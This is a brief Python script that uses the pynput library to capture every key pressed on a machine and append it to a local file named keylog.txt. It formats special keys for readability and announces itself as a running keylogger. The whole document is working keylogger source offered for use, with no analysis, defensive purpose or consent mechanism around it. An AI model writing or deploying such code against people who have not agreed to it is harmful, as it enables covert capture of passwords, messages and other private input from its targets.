
from pynput.keyboard import Listener
def log_keystrokes(key):
    # Convert the key to a string and remove quotes around it
    key = str(key).replace("'", "")
    with open("keylog.txt", "a") as log_file:
        # Format special keys for readability
        if key == 'Key.space':
            log_file.write(" ")
        elif key == 'Key.enter':
            log_file.write("\n")
        elif key.startswith("Key"):
            log_file.write(f" [{key}] ")
        else:
            log_file.write(key)

# Example to start the keylogger
with Listener(on_press=log_keystrokes) as listener:
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener.join()

    
